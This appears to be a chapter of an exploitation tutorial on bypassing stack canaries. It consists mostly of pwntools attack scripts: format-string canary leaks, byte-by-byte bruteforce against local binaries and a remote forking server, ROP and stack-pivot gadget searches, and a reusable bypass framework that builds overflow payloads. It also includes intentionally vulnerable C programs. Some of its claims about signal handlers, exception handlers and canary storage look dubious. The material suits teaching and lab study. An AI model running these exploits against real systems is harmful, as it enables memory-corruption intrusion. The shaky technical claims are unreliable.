# Stack Canary Bypass

Stack canaries are a crucial defense against buffer overflow attacks, but they can be bypassed using various techniques. Understanding these bypass methods is essential for both attackers and defenders to properly assess security risks.

## Understanding Stack Canaries

### How Stack Canaries Work

```c
// Simplified canary implementation
void function_with_buffer() {
    // 1. Compiler inserts canary load
    unsigned long canary = __stack_chk_guard;
    
    char buffer[256];  // Local variables
    
    // User code here...
    gets(buffer);  // Vulnerable operation
    
    // 2. Compiler inserts canary check before return
    if (canary != __stack_chk_guard) {
        __stack_chk_fail();  // Abort program
    }
    
    return;  // Safe to return
}
```

### Stack Layout with Canaries

```
Stack Frame with Canary:
High Address
┌─────────────────────┐
│   Function Args     │
├─────────────────────┤
│   Return Address    │ ← Target for control flow hijacking
├─────────────────────┤
│   Saved RBP         │
├─────────────────────┤
│   Stack Canary      │ ← Detection mechanism (8 bytes)
├─────────────────────┤
│   Local Variables   │ ← Buffer overflow starts here
│   (buffer[256])     │
└─────────────────────┘
Low Address
```

## Information Leak Techniques

### Method 1: Format String Leak

```c
// vuln_format_canary.c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
    char format_buffer[100];
    char overflow_buffer[100];
    
    printf("Enter format string: ");
    fgets(format_buffer, sizeof(format_buffer), stdin);
    
    // VULNERABLE: Format string leak
    printf(format_buffer);
    
    printf("Enter data: ");
    gets(overflow_buffer);  // VULNERABLE: Buffer overflow
    
    printf("Function completed\n");
}

int main() {
    vulnerable_function();
    return 0;
}
```

**Exploitation:**
```python
#!/usr/bin/env python3
from pwn import *

def exploit_format_string_canary_leak():
    """Leak canary using format string vulnerability"""
    
    context.arch = 'amd64'
    p = process('./vuln_format_canary')
    
    # Step 1: Leak the canary using format string
    # Try different offsets to find the canary
    for offset in range(10, 30):
        p = process('./vuln_format_canary')
        
        # Send format string to leak stack value
        payload = f'%{offset}$p\n'.encode()
        p.send(payload)
        
        # Receive output
        try:
            output = p.recvline(timeout=1)
            
            # Look for canary pattern (typically ends with 0x00)
            if b'0x' in output:
                leaked_value = output.strip()
                addr = int(leaked_value, 16)
                
                # Canary typically has null byte at end
                if (addr & 0xff) == 0 and addr > 0x1000:
                    print(f"Potential canary at offset {offset}: {hex(addr)}")
                    
                    # Test this canary value
                    p.sendline(b'test')
                    p.close()
                    
                    return offset, addr
        except:
            pass
        
        p.close()
    
    print("Could not find canary")
    return None, None

def exploit_with_leaked_canary():
    """Complete exploit using leaked canary"""
    
    # First, leak the canary
    offset, canary = exploit_format_string_canary_leak()
    
    if not canary:
        print("Failed to leak canary")
        return
    
    print(f"Leaked canary: {hex(canary)}")
    
    # Step 2: Use leaked canary in buffer overflow
    p = process('./vuln_format_canary')
    
    # Skip format string part
    p.sendline(b'hello')
    
    # Build overflow payload preserving canary
    payload = b'A' * 100        # Fill buffer
    payload += p64(canary)      # Preserve canary
    payload += b'B' * 8         # Saved RBP
    payload += p64(0x401234)    # Return address (example)
    
    p.sendline(payload)
    p.interactive()

exploit_format_string_canary_leak()
```

### Method 2: Memory Disclosure via Overflow

```python
#!/usr/bin/env python3
from pwn import *

def partial_overwrite_canary_leak():
    """Leak canary by partial overwrites"""
    
    # This technique works when we can:
    # 1. Partially overwrite canary
    # 2. Program doesn't immediately exit
    # 3. We can observe behavior differences
    
    for canary_byte in range(256):
        try:
            p = process('./vuln_program')
            
            # Overflow to partially overwrite canary's first byte
            payload = b'A' * 100  # Fill buffer to canary
            payload += bytes([canary_byte])  # Guess canary's first byte
            
            p.sendline(payload)
            
            # Check if program continues normally
            try:
                output = p.recv(timeout=1)
                if b'completed' in output:
                    print(f"Possible canary byte: 0x{canary_byte:02x}")
            except:
                pass  # Program crashed, wrong guess
            
            p.close()
            
        except:
            continue

def bruteforce_canary_byte_by_byte():
    """Bruteforce canary one byte at a time"""
    
    context.log_level = 'error'  # Reduce noise
    
    canary = b''
    buffer_size = 100  # Distance to canary
    
    # Bruteforce each byte of the canary
    for byte_pos in range(8):  # 64-bit canary
        print(f"Bruteforcing canary byte {byte_pos}")
        
        for guess in range(256):
            try:
                p = process('./vuln_program')
                
                # Payload: buffer + partial canary
                payload = b'A' * buffer_size
                payload += canary + bytes([guess])
                
                p.sendline(payload)
                
                # Check if program didn't crash
                try:
                    output = p.recvall(timeout=1)
                    if len(output) > 0:  # Program responded
                        canary += bytes([guess])
                        print(f"Found byte {byte_pos}: 0x{guess:02x}")
                        p.close()
                        break
                except:
                    pass  # Program crashed
                
                p.close()
                
            except:
                continue
        else:
            print(f"Could not find byte {byte_pos}")
            break
    
    print(f"Recovered canary: {canary.hex()}")
    return canary

# Example usage
# bruteforce_canary_byte_by_byte()
```

## Bypass Techniques

### Method 3: Overwrite Canary Storage

```python
#!/usr/bin/env python3
from pwn import *

def overwrite_canary_storage():
    """Overwrite the canary storage location"""
    
    # The canary is typically stored at %fs:0x28 on x86_64
    # If we can write to this location, we can change the "expected" value
    
    canary_corruption_c = '''
#include <stdio.h>
#include <string.h>

// Global canary storage (simplified example)
unsigned long global_canary = 0xdeadbeefcafebabe;

void vulnerable_function() {
    char buffer[100];
    unsigned long local_canary = global_canary;
    
    printf("Enter data: ");
    gets(buffer);  // Can overflow
    
    // Check against global canary (which we might have corrupted)
    if (local_canary != global_canary) {
        printf("Stack smashing detected!\\n");
        abort();
    }
    
    printf("Function completed\\n");
}

int main() {
    printf("Global canary at: %p\\n", &global_canary);
    vulnerable_function();
    return 0;
}
'''
    
    print("Canary storage corruption concept:")
    print("1. Find address of canary storage")
    print("2. Use vulnerability to write to that address")
    print("3. Change expected canary value")
    print("4. Overflow buffer with matching canary")

def thread_local_storage_attack():
    """Attack thread-local storage where canary is kept"""
    
    tls_attack_c = '''
#include <stdio.h>
#include <string.h>
#include <pthread.h>

void* vulnerable_thread(void* arg) {
    char buffer[100];
    
    printf("Thread canary location: %%fs:0x28\\n");
    
    // If we can write to %fs:0x28, we control the canary
    // This requires specific vulnerabilities like:
    // - Arbitrary write primitive
    // - Thread-local storage corruption
    
    gets(buffer);
    
    printf("Thread completed\\n");
    return NULL;
}

int main() {
    pthread_t thread;
    pthread_create(&thread, NULL, vulnerable_thread, NULL);
    pthread_join(thread, NULL);
    return 0;
}
'''
    
    print("Thread-local storage attack:")
    print("1. Canary stored in thread-local storage (%fs:0x28)")
    print("2. Corrupt TLS to change canary value")
    print("3. Overflow with matching corrupted canary")

overwrite_canary_storage()
```

### Method 4: Fork-Based Bruteforce

```python
#!/usr/bin/env python3
from pwn import *

def fork_based_bruteforce():
    """Bruteforce canary using fork() behavior"""
    
    # When a process forks, child inherits parent's canary
    # We can bruteforce byte-by-byte without canary changing
    
    fork_exploit_c = '''
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

void vulnerable_function() {
    char buffer[100];
    
    printf("PID: %d\\n", getpid());
    printf("Enter data: ");
    
    gets(buffer);
    
    printf("Data received: %s\\n", buffer);
    printf("Function completed\\n");
}

int main() {
    while (1) {
        pid_t pid = fork();
        
        if (pid == 0) {
            // Child process - has same canary as parent
            vulnerable_function();
            return 0;
        } else {
            // Parent process - wait for child
            int status;
            wait(&status);
            
            if (WIFEXITED(status)) {
                printf("Child exited normally\\n");
            } else {
                printf("Child crashed\\n");
            }
        }
    }
    
    return 0;
}
'''
    
    def exploit_forking_server():
        """Exploit forking server with canary bruteforce"""
        
        canary = b''
        buffer_offset = 104  # Distance to canary
        
        for byte_position in range(8):  # 8-byte canary
            print(f"Bruteforcing canary byte {byte_position}")
            
            for candidate in range(256):
                p = remote('target', 1234)  # Connect to forking server
                
                # Build payload
                payload = b'A' * buffer_offset
                payload += canary + bytes([candidate])
                
                p.sendline(payload)
                
                # Check response
                try:
                    response = p.recvall(timeout=2)
                    if b'completed' in response:
                        # Found correct byte
                        canary += bytes([candidate])
                        print(f"Found byte {byte_position}: 0x{candidate:02x}")
                        p.close()
                        break
                except:
                    pass  # Connection died, wrong guess
                
                p.close()
            else:
                print(f"Failed to find byte {byte_position}")
                return None
        
        print(f"Complete canary: {canary.hex()}")
        return canary
    
    print("Fork-based bruteforce:")
    print("1. Server forks for each connection")
    print("2. Child processes inherit parent's canary")
    print("3. Bruteforce one byte at a time")
    print("4. Correct bytes don't crash the child")

fork_based_bruteforce()
```

### Method 5: Stack Pivot and ROP

```python
#!/usr/bin/env python3
from pwn import *

def stack_pivot_bypass():
    """Bypass canary using stack pivot"""
    
    # Instead of overwriting return address directly,
    # pivot stack to controlled memory
    
    context.arch = 'amd64'
    
    def find_stack_pivot_gadget():
        """Find stack pivot gadgets"""
        
        elf = ELF('./target_binary')
        
        # Look for stack pivot gadgets
        # Common patterns: mov rsp, reg; ret
        # add rsp, value; ret
        # xchg rsp, reg; ret
        
        pivot_gadgets = [
            asm('mov rsp, rax; ret'),
            asm('mov rsp, rbx; ret'), 
            asm('add rsp, 0x10; ret'),
            asm('pop rsp; ret'),
        ]
        
        print("Looking for stack pivot gadgets...")
        for gadget in pivot_gadgets:
            # Search in binary
            for addr in elf.search(gadget):
                print(f"Found pivot gadget at 0x{addr:x}: {disasm(gadget)}")
    
    def exploit_with_stack_pivot():
        """Exploit using stack pivot to avoid canary"""
        
        # Allocate controlled memory (heap, BSS, etc.)
        controlled_memory = 0x404800  # Example BSS address
        
        # Build ROP chain in controlled memory
        rop_chain = [
            0x401234,  # pop rdi; ret
            controlled_memory + 0x100,  # "/bin/sh" string
            0x401567,  # system address
        ]
        
        # First stage: write ROP chain to controlled memory
        # This might use format string, heap overflow, etc.
        
        # Second stage: stack pivot
        payload = b'A' * 100  # Fill buffer (don't touch canary)
        # Use different vulnerability to control RSP
        
        print("Stack pivot bypass strategy:")
        print("1. Write ROP chain to controlled memory")
        print("2. Use stack pivot to change RSP")
        print("3. Execute ROP chain from new stack location")
        print("4. Never overwrite canary or return address")
    
    find_stack_pivot_gadget()

def ret2libc_bypass():
    """Bypass canary using ret2libc without stack smashing"""
    
    context.arch = 'amd64'
    
    def one_gadget_approach():
        """Use one_gadget to avoid complex ROP"""
        
        # Find one_gadget in libc
        # one_gadget gives direct shell without setup
        
        libc_leak = 0x7ffff7a00000  # Example leaked libc base
        one_gadget_offset = 0x45216  # Example one_gadget offset
        
        one_gadget_addr = libc_leak + one_gadget_offset
        
        print(f"one_gadget address: 0x{one_gadget_addr:x}")
        
        # Strategy: use different vulnerability to call one_gadget
        # - Function pointer overwrite
        # - GOT overwrite
        # - Virtual table corruption
        
        print("one_gadget bypass strategy:")
        print("1. Leak libc address")
        print("2. Calculate one_gadget address")
        print("3. Overwrite function pointer with one_gadget")
        print("4. Trigger function call")
    
    def function_pointer_overwrite():
        """Overwrite function pointer instead of return address"""
        
        # Many programs have function pointers that can be overwritten
        # - Virtual function tables
        # - Callback functions
        # - Function pointer arrays
        
        function_ptr_c = '''
void (*callback)(void) = NULL;

void set_callback(void (*func)(void)) {
    callback = func;
}

void trigger_callback() {
    if (callback) {
        callback();  // Call overwritten function
    }
}

void vulnerable_function() {
    char buffer[100];
    gets(buffer);  // Overflow but don't touch canary
    
    // If buffer is adjacent to callback pointer...
    trigger_callback();
}
'''
        
        print("Function pointer overwrite:")
        print("1. Find function pointer near buffer")
        print("2. Overflow to overwrite pointer")
        print("3. Don't touch stack canary")
        print("4. Trigger function pointer call")
    
    one_gadget_approach()

stack_pivot_bypass()
```

## Advanced Bypass Techniques

### Method 6: Signal Handler Exploitation

```python
#!/usr/bin/env python3
from pwn import *

def signal_handler_bypass():
    """Bypass canary using signal handlers"""
    
    signal_exploit_c = '''
#include <stdio.h>
#include <signal.h>
#include <string.h>

void signal_handler(int sig) {
    printf("Signal received: %d\\n", sig);
    
    // Signal handler has its own stack frame
    // No canary protection here in some cases
    char handler_buffer[100];
    gets(handler_buffer);  // Vulnerable in signal context
    
    printf("Handler completed\\n");
}

void vulnerable_function() {
    signal(SIGUSR1, signal_handler);
    
    char buffer[100];
    printf("Enter data: ");
    gets(buffer);  // This has canary protection
    
    // Trigger signal
    kill(getpid(), SIGUSR1);
    
    printf("Function completed\\n");
}
'''
    
    print("Signal handler bypass:")
    print("1. Register signal handler")
    print("2. Signal handler may lack canary protection")
    print("3. Trigger signal during execution")
    print("4. Exploit vulnerability in signal handler")

def setjmp_longjmp_bypass():
    """Bypass canary using setjmp/longjmp"""
    
    setjmp_exploit_c = '''
#include <stdio.h>
#include <setjmp.h>
#include <string.h>

jmp_buf jump_buffer;

void vulnerable_function() {
    char buffer[100];
    
    // setjmp saves current stack state
    if (setjmp(jump_buffer) == 0) {
        printf("Enter data: ");
        gets(buffer);  // This can overflow
        
        // longjmp bypasses normal return
        longjmp(jump_buffer, 1);
    } else {
        printf("Jumped back\\n");
    }
    
    // This return statement is never reached
    printf("Function completed\\n");
}
'''
    
    print("setjmp/longjmp bypass:")
    print("1. setjmp saves stack state before overflow")
    print("2. Overflow buffer (canary gets corrupted)")
    print("3. longjmp restores old stack state")
    print("4. Bypass canary check entirely")

signal_handler_bypass()
```

### Method 7: Exception Handler Hijacking

```python
#!/usr/bin/env python3

def exception_handler_bypass():
    """Bypass canary using exception handlers"""
    
    exception_exploit_cpp = '''
#include <iostream>
#include <cstring>

class CustomException {
public:
    char data[100];
    
    CustomException(const char* msg) {
        strcpy(data, msg);  // Potential overflow
    }
};

void vulnerable_function() {
    char buffer[100];
    
    try {
        std::cin >> buffer;  // Stack canary protected
        
        if (strlen(buffer) > 50) {
            throw CustomException(buffer);  // Exception object on heap
        }
        
        std::cout << "Normal execution" << std::endl;
        
    } catch (CustomException& e) {
        std::cout << "Exception: " << e.data << std::endl;
        // Exception handling doesn't check stack canary
    }
}
'''
    
    print("Exception handler bypass:")
    print("1. Exception objects allocated on heap")
    print("2. Exception handlers may lack canary checks")
    print("3. Corrupt exception handler metadata")
    print("4. Control flow through exception mechanism")

def structured_exception_handling():
    """Windows SEH bypass techniques"""
    
    seh_exploit_c = '''
// Windows Structured Exception Handling
#include <windows.h>
#include <stdio.h>

EXCEPTION_DISPOSITION ExceptionHandler(
    EXCEPTION_RECORD* ExceptionRecord,
    void* EstablisherFrame,
    CONTEXT* ContextRecord,
    void* DispatcherContext) {
    
    printf("Exception handler called\\n");
    
    // Modify context to redirect execution
    ContextRecord->Eip = 0x41414141;  // Control EIP
    
    return ExceptionContinueExecution;
}

void vulnerable_function() {
    __try {
        char buffer[100];
        gets(buffer);  // Can overflow and corrupt SEH chain
    }
    __except(ExceptionHandler(GetExceptionInformation(), 
                             GetExceptionCode(), 
                             GetExceptionContext(), 
                             NULL)) {
        printf("Exception handled\\n");
    }
}
'''
    
    print("Windows SEH bypass:")
    print("1. Overflow corrupts SEH chain")
    print("2. Trigger exception (access violation)")
    print("3. Controlled exception handler executes")
    print("4. Modify execution context")

exception_handler_bypass()
```

## Mitigation Evasion

### Defeating Enhanced Canary Protections

```python
#!/usr/bin/env python3

def enhanced_canary_evasion():
    """Techniques against enhanced canary protections"""
    
    # Modern compilers use multiple canary types
    
    def xor_canary_bypass():
        """Bypass XOR canaries"""
        
        xor_canary_c = '''
// Some implementations XOR canary with return address
void function_with_xor_canary() {
    unsigned long canary = __stack_chk_guard;
    unsigned long return_addr = __builtin_return_address(0);
    unsigned long xor_canary = canary ^ return_addr;
    
    char buffer[100];
    gets(buffer);
    
    // Check XOR'd canary
    if ((canary ^ __builtin_return_address(0)) != xor_canary) {
        abort();
    }
}
'''
        
        print("XOR canary bypass:")
        print("1. Leak both canary and return address")
        print("2. Calculate expected XOR value")
        print("3. Craft payload preserving XOR relationship")
    
    def terminator_canary_info():
        """Information about terminator canaries"""
        
        print("Terminator canary details:")
        print("- Contains null byte (0x00)")
        print("- Contains newline (0x0a)")
        print("- Contains EOF (0xff)")
        print("- Contains carriage return (0x0d)")
        print("- Designed to stop string functions")
        print("- Can still be leaked/bypassed")
    
    def random_canary_challenges():
        """Challenges with random canaries"""
        
        print("Random canary challenges:")
        print("- 64-bit entropy makes bruteforce difficult")
        print("- Must be leaked or calculated")
        print("- Regenerated on fork() in some systems")
        print("- Thread-local storage protection")
    
    xor_canary_bypass()
    terminator_canary_info()
    random_canary_challenges()

def compiler_specific_bypasses():
    """Compiler-specific canary bypass techniques"""
    
    gcc_specifics = {
        'version': 'GCC canary implementation',
        'storage': '%fs:0x28 (x86_64)',
        'function': '__stack_chk_guard',
        'fail_function': '__stack_chk_fail',
        'weaknesses': [
            'Global canary storage',
            'Predictable location',
            'Same across threads'
        ]
    }
    
    clang_specifics = {
        'version': 'Clang canary implementation',
        'storage': 'Similar to GCC',
        'function': '__stack_chk_guard',
        'fail_function': '__stack_chk_fail',
        'weaknesses': [
            'Compatible with GCC',
            'Additional optimizations may vary'
        ]
    }
    
    print("Compiler-specific canary details:")
    for compiler, details in [('GCC', gcc_specifics), ('Clang', clang_specifics)]:
        print(f"\n{compiler}:")
        for key, value in details.items():
            if isinstance(value, list):
                print(f"  {key}: {', '.join(value)}")
            else:
                print(f"  {key}: {value}")

enhanced_canary_evasion()
```

## Comprehensive Canary Bypass Framework

```python
#!/usr/bin/env python3
from pwn import *

class CanaryBypassFramework:
    def __init__(self, target_binary):
        self.binary = target_binary
        self.elf = ELF(target_binary)
        self.canary_value = None
        
    def detect_canary_protection(self):
        """Detect if binary has canary protection"""
        
        # Check for stack_chk symbols
        if '__stack_chk_fail' in self.elf.symbols:
            print("✓ Stack canary protection detected")
            return True
        else:
            print("✗ No stack canary protection")
            return False
    
    def attempt_format_string_leak(self):
        """Try to leak canary via format string"""
        
        print("Attempting format string canary leak...")
        
        for offset in range(1, 50):
            try:
                p = process(self.binary)
                
                # Try format string
                payload = f'%{offset}$p'
                p.sendline(payload.encode())
                
                output = p.recvall(timeout=1)
                
                # Look for potential canary values
                if b'0x' in output:
                    value_str = output.split(b'0x')[1].split()[0]
                    try:
                        value = int(value_str, 16)
                        # Canary typically has null byte
                        if (value & 0xff) == 0 and value > 0x1000:
                            print(f"Potential canary at offset {offset}: 0x{value:016x}")
                            self.canary_value = value
                            return True
                    except:
                        pass
                
                p.close()
                
            except:
                continue
        
        return False
    
    def attempt_bruteforce(self):
        """Attempt byte-by-byte bruteforce"""
        
        print("Attempting canary bruteforce...")
        
        context.log_level = 'error'
        canary = b''
        
        for byte_pos in range(8):
            found = False
            
            for guess in range(256):
                try:
                    p = process(self.binary)
                    
                    # Build payload
                    payload = b'A' * 104  # Adjust offset
                    payload += canary + bytes([guess])
                    
                    p.sendline(payload)
                    
                    # Check if program survived
                    try:
                        output = p.recvall(timeout=1)
                        if len(output) > 0:
                            canary += bytes([guess])
                            print(f"Found canary byte {byte_pos}: 0x{guess:02x}")
                            found = True
                            break
                    except:
                        pass
                    
                    p.close()
                    
                except:
                    continue
            
            if not found:
                print(f"Could not bruteforce byte {byte_pos}")
                return False
        
        self.canary_value = u64(canary)
        print(f"Bruteforced canary: 0x{self.canary_value:016x}")
        return True
    
    def generate_bypass_payload(self, target_address):
        """Generate payload that bypasses canary"""
        
        if not self.canary_value:
            print("No canary value available")
            return None
        
        payload = b'A' * 104        # Fill buffer
        payload += p64(self.canary_value)  # Preserve canary
        payload += b'B' * 8         # Saved RBP
        payload += p64(target_address)     # Return address
        
        return payload
    
    def test_bypass(self, payload):
        """Test canary bypass payload"""
        
        try:
            p = process(self.binary)
            p.sendline(payload)
            
            # Check if we maintained control
            output = p.recvall(timeout=2)
            
            if p.returncode == 0:
                print("✓ Canary bypass successful")
                return True
            else:
                print("✗ Canary bypass failed")
                return False
                
        except:
            print("✗ Bypass test failed")
            return False

# Usage example
def demonstrate_canary_bypass():
    """Demonstrate comprehensive canary bypass"""
    
    framework = CanaryBypassFramework('./vulnerable_program')
    
    # Step 1: Detect protection
    if not framework.detect_canary_protection():
        print("No canary protection to bypass")
        return
    
    # Step 2: Try leak methods
    if not framework.attempt_format_string_leak():
        print("Format string leak failed, trying bruteforce...")
        if not framework.attempt_bruteforce():
            print("All bypass methods failed")
            return
    
    # Step 3: Generate bypass payload
    target_addr = 0x401234  # Example target address
    payload = framework.generate_bypass_payload(target_addr)
    
    if payload:
        # Step 4: Test bypass
        framework.test_bypass(payload)

# demonstrate_canary_bypass()
```

## Key Takeaways

!!! important "Canary Bypass Fundamentals"
    - **Information disclosure is key** - Most bypasses require leaking the canary value
    - **Multiple attack vectors exist** - Format strings, partial overwrites, bruteforce
    - **Implementation details matter** - Compiler and system specifics affect bypass methods
    - **Alternative attack paths** - Stack pivots, function pointers, exception handlers
    - **Modern enhancements complicate bypasses** - XOR canaries, random values, enhanced storage

!!! warning "Common Mistakes in Bypass Attempts"
    - Not accounting for null bytes in canary values
    - Assuming canary is at fixed offset from buffer
    - Forgetting about saved frame pointer between canary and return address
    - Not considering thread-local storage variations
    - Overlooking compiler-specific implementation differences

!!! tip "Defensive Recommendations"
    - Enable canaries on all functions, not just those with arrays
    - Use random canaries rather than terminator canaries
    - Implement additional protections beyond canaries
    - Regularly update compilers for enhanced canary implementations
    - Monitor for canary bypass attempts in logs

---

*Next: [Return-to-libc Techniques](03-ret2libc.md)*
